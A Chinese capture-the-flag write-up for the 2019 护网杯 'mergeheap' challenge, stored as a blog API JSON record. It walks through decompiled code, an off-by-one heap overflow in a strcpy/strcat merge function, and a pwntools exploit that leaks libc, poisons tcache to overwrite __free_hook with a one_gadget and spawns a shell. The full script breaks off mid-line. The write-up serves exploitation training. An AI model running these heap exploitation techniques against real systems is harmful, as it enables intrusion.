{"title":"2019护网杯_mergeheap","slug":"2019护网杯-mergeheap","date":"2019-09-10T12:24:26.000Z","updated":"2019-09-10T12:26:27.888Z","comments":true,"path":"api/articles/2019护网杯-mergeheap.json","photos":[],"link":"","excerpt":null,"covers":null,"content":"<h1 id=\"mergeheap\"><a href=\"#mergeheap\" class=\"headerlink\" title=\"mergeheap\"></a>mergeheap</h1><h2 id=\"审计与分析\"><a href=\"#审计与分析\" class=\"headerlink\" title=\"审计与分析\"></a>审计与分析</h2><h3 id=\"add\"><a href=\"#add\" class=\"headerlink\" title=\"add\"></a>add</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">add</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> i; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">14</span> &amp;&amp; ptrs[i]; ++i )</span><br><span class=\"line\">    ;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( i &gt; <span class=\"number\">14</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"full\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"len:\"</span>);</span><br><span class=\"line\">  v2 = read_num();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v2 &lt; <span class=\"number\">0</span> || v2 &gt; <span class=\"number\">1024</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"invalid\"</span>);</span><br><span class=\"line\">  ptrs[i] = <span class=\"built_in\">malloc</span>(v2);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"content:\"</span>);</span><br><span class=\"line\">  read_until_nil(ptrs[i], v2);</span><br><span class=\"line\">  dword_202060[i] = v2;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"Done\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>最多14个堆块，大小在0到0x400之间，将每个堆块指针和堆块size存储在bss段上的全局数组处。</p>\n<h3 id=\"show\"><a href=\"#show\" class=\"headerlink\" title=\"show\"></a>show</h3><p>会输出对应堆块指针中的值。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">show</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v1; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"idx:\"</span>);</span><br><span class=\"line\">  v1 = read_num();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &gt;= <span class=\"number\">0</span> &amp;&amp; v1 &lt;= <span class=\"number\">14</span> &amp;&amp; ptrs[v1] )</span><br><span class=\"line\">    result = <span class=\"built_in\">puts</span>((<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *)ptrs[v1]);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    result = <span class=\"built_in\">puts</span>(<span class=\"string\">\"invalid\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"delete\"><a href=\"#delete\" class=\"headerlink\" title=\"delete\"></a>delete</h3><p>会free掉对应下标的堆块，然后将堆块指针置为null，堆块大小设置为0，不存在UAF、2Free等漏洞。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">dele</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  _DWORD *v0; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> idx; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"idx:\"</span>);</span><br><span class=\"line\">  idx = read_num();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( idx &gt;= <span class=\"number\">0</span> &amp;&amp; idx &lt;= <span class=\"number\">14</span> &amp;&amp; ptrs[idx] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>((<span class=\"keyword\">void</span> *)ptrs[idx]);</span><br><span class=\"line\">    ptrs[idx] = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">    v0 = ptr_sizes;</span><br><span class=\"line\">    ptr_sizes[idx] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">\"invalid\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)v0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"merge\"><a href=\"#merge\" class=\"headerlink\" title=\"merge\"></a>merge</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">merge</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v1; <span class=\"comment\">// ST1C_4</span></span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> i; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> first_idx; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> second_idx; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">14</span> &amp;&amp; ptrs[i]; ++i )</span><br><span class=\"line\">    ;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( i &gt; <span class=\"number\">14</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"full\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"idx1:\"</span>);</span><br><span class=\"line\">  first_idx = read_num();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( first_idx &lt; <span class=\"number\">0</span> || first_idx &gt; <span class=\"number\">14</span> || !ptrs[first_idx] )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"invalid\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"idx2:\"</span>);</span><br><span class=\"line\">  second_idx = read_num();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( second_idx &lt; <span class=\"number\">0</span> || second_idx &gt; <span class=\"number\">14</span> || !ptrs[second_idx] )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"invalid\"</span>);</span><br><span class=\"line\">  v1 = ptr_sizes[first_idx] + ptr_sizes[second_idx];</span><br><span class=\"line\">  ptrs[i] = <span class=\"built_in\">malloc</span>(v1);</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>((<span class=\"keyword\">char</span> *)ptrs[i], (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *)ptrs[first_idx]);</span><br><span class=\"line\">  <span class=\"built_in\">strcat</span>((<span class=\"keyword\">char</span> *)ptrs[i], (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *)ptrs[second_idx]);</span><br><span class=\"line\">  ptr_sizes[i] = v1;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"Done\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>会malloc一个新的chunk，大小等于两个chunk大小之和，然后通过c标准库的strcpy和strcat函数实现字符串拷贝与拼接。这里显然存在溢出漏洞，因为strcpy/strcat会拷贝到NULL字符，而堆块的内容都是通过read函数逐字节读入的，如果不录入换行符就会读到相应的size大小处。所以若不手工录入NULL字符，并且存在堆块结构复用（复用下一个堆块的prev_size位），那么在调用<code>merge</code>时可以溢出到下一个chunk的size字段（off-by-one）。</p>\n<p>利用这一点我们可以构造overlapping，改大下一个chunk的size字段，再结合tcache的机制，实现任意地址分配和任意地址写。</p>\n<h2 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h2><h3 id=\"leak-libc\"><a href=\"#leak-libc\" class=\"headerlink\" title=\"leak libc\"></a>leak libc</h3><p>比赛时我写的比较麻烦，因为有一段时间没有做题了，并且对tcache的机制也不是太熟悉。思路还是传统的通过leak unsorted bin中指向libc中main_arena的地址实现，但是如果申请chunk的大小位于tcache范围内，首先需要填满对应的tcache数组，所以我用了7个块填充。实际上，直接构造两个大块，然后利用merge构造出大于0x400的chunk，再释放就可以直接放入unsorted bin中。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># leak libc &amp; heap addr</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"a\"</span>*<span class=\"number\">0x80</span>)<span class=\"comment\"># 0</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"a\"</span>*<span class=\"number\">0x80</span>)<span class=\"comment\"># 1</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"a\"</span>*<span class=\"number\">0x80</span>)<span class=\"comment\"># 2</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"a\"</span>*<span class=\"number\">0x80</span>)<span class=\"comment\"># 3</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"a\"</span>*<span class=\"number\">0x80</span>)<span class=\"comment\"># 4</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"a\"</span>*<span class=\"number\">0x80</span>)<span class=\"comment\"># 5</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"a\"</span>*<span class=\"number\">0x80</span>)<span class=\"comment\"># 6</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"b\"</span>*<span class=\"number\">0x80</span>)<span class=\"comment\"># 7</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, <span class=\"string\">\"c\"</span>*<span class=\"number\">0x10</span>)<span class=\"comment\"># 8</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"b\"</span>*<span class=\"number\">0x80</span>)<span class=\"comment\"># 9</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>, <span class=\"string\">\"c\"</span>*<span class=\"number\">0x18</span>)<span class=\"comment\"># 10</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">7</span>):</span><br><span class=\"line\">\tdele(i) <span class=\"comment\"># kong 0~6</span></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">7</span>) <span class=\"comment\"># kong 7</span></span><br><span class=\"line\">dele(<span class=\"number\">9</span>) <span class=\"comment\"># kong 9</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x8</span>,<span class=\"string\">\"e\"</span>*<span class=\"number\">8</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">heap_addr = u64(p.recv(<span class=\"number\">6</span>+<span class=\"number\">8</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>)) - <span class=\"number\">0x6f0</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"heap addr is \"</span> + hex(heap_addr)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>,<span class=\"string\">\"e\"</span>*<span class=\"number\">0x60</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x8</span>,<span class=\"string\">\"e\"</span>*<span class=\"number\">8</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\">addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\">libc_addr = addr - <span class=\"number\">0x3ebd20</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"libc addr is \"</span> + hex(libc_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">one_gadget = libc_addr + <span class=\"number\">0x4f322</span></span><br><span class=\"line\">free_hook = libc_addr + libc.symbols[<span class=\"string\">'__free_hook'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>,<span class=\"string\">\"\\x00\"</span> * <span class=\"number\">0x60</span>) <span class=\"comment\"># 3</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Overlapping\"><a href=\"#Overlapping\" class=\"headerlink\" title=\"Overlapping\"></a>Overlapping</h3><p>当第一个chunk为0x1f8，第二个chunk为0x90时，<code>merge</code>函数会<code>malloc(0x28f)</code>，这时我们前述的off-by-one漏洞就可以被触发，我们可以顺利的溢出下一个chunk的size字段。将改大的chunk释放后再次申请时就可以溢出被重叠的堆块，而这个堆块首先被放在tcache数组中，所以我们也就溢出修改了next指针。令next指针指向<code>free_hook</code>，那么再申请两次时就会将堆块申请在<code>free_hook</code>处，最终实现任意地址写。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># make overlapping &amp; getshell</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x1f8</span>, <span class=\"string\">\"\\x80\"</span> * <span class=\"number\">0x1f8</span>) <span class=\"comment\"># 4</span></span><br><span class=\"line\">add(<span class=\"number\">0x90</span>, <span class=\"string\">\"\\x80\"</span> * <span class=\"number\">0x90</span>) <span class=\"comment\"># 5</span></span><br><span class=\"line\">add(<span class=\"number\">0x280</span>, <span class=\"string\">\"\\x80\"</span> * <span class=\"number\">0x280</span>) <span class=\"comment\"># 6</span></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>, <span class=\"string\">\"\\x80\"</span>*<span class=\"number\">0x40</span>) <span class=\"comment\"># 7</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>, <span class=\"string\">\"\\x00\"</span> * <span class=\"number\">0x30</span>) <span class=\"comment\"># 9</span></span><br><span class=\"line\">dele(<span class=\"number\">6</span>) <span class=\"comment\"># kong 6</span></span><br><span class=\"line\">merge(<span class=\"number\">4</span>, <span class=\"number\">5</span>) <span class=\"comment\"># 6 make 7's size bigger</span></span><br><span class=\"line\">dele(<span class=\"number\">7</span>) <span class=\"comment\"># kong 7</span></span><br><span class=\"line\">dele(<span class=\"number\">9</span>) <span class=\"comment\"># kong 9 0x30 tcache</span></span><br><span class=\"line\">fake_chunk = <span class=\"string\">\"a\"</span>* <span class=\"number\">0x40</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x41</span>) + p64(free_hook) <span class=\"comment\"># overflow </span></span><br><span class=\"line\">add(<span class=\"number\">0x70</span>, fake_chunk.ljust(<span class=\"number\">0x70</span>, <span class=\"string\">\"\\x00\"</span>)) <span class=\"comment\"># 7</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>, <span class=\"string\">\"a\"</span>*<span class=\"number\">0x30</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x30</span>, p64(one_gadget).ljust(<span class=\"number\">0x30</span>,<span class=\"string\">\"\\x00\"</span>)) <span class=\"comment\"># tcache poisoning</span></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">3</span>)</span><br></pre></td></tr></table></figure>\n<h3 id=\"完整exp\"><a href=\"#完整exp\" class=\"headerlink\" title=\"完整exp\"></a>完整exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./mergeheap\"</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./mergeheap\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"&gt;&gt;\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"len:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"content:\"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"&gt;&gt;\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"idx:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dele</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"&gt;&gt;\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"idx:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">merge</span><span class=\"params\">(idx1, idx2)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"&gt;&gt;\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"idx1:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(idx1))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"idx2:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(idx2))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak libc &amp; heap addr</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"a\"</span>*<span class=\"number\">0x80</span>)<span class=\"comment\"># 0</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"a\"</span>*<span class=\"number\">0x80</span>)<span class=\"comment\"># 1</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"a\"</span>*<span class=\"number\">0x80</span>)<span class=\"comment\"># 2</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"a\"</span>*<span class=\"number\">0x80</span>)<span class=\"comment\"># 3</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"a\"</span>*<span class=\"number\">0x80</span>)<span class=\"comment\"># 4</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"a\"</span>*<span class=\"number\">0x80</span>)<span class=\"comment\"># 5</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"a\"</span>*<span class=\"number\">0x80</span>)<span class=\"comment\"># 6</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"b\"</span>*<span class=\"number\">0x80</span>)<span class=\"comment\"># 7</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, <span class=\"string\">\"c\"</span>*<span class=\"number\">0x10</span>)<span class=\"comment\"># 8</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"b\"</span>*<span class=\"number\">0x80</span>)<span class=\"comment\"># 9</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>, <span class=\"string\">\"c\"</span>*<span class=\"number\">0x18</span>)<span class=\"comment\"># 10</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">7</span>):</span><br><span class=\"line\">\tdele(i) <span class=\"comment\"># kong 0~6</span></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">7</span>) <span class=\"comment\"># kong 7</span></span><br><span class=\"line\">dele(<span class=\"number\">9</span>) <span class=\"comment\"># kong 9</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x8</span>,<span class=\"string\">\"e\"</span>*<span class=\"number\">8</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">heap_addr = u64(p.recv(<span class=\"number\">6</span>+<span class=\"number\">8</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>)) - <span class=\"number\">0x6f0</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"heap addr is \"</span> + hex(heap_addr)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>,<span class=\"string\">\"e\"</span>*<span class=\"number\">0x60</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x8</span>,<span class=\"string\">\"e\"</span>*<span class=\"number\">8</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">show(<span 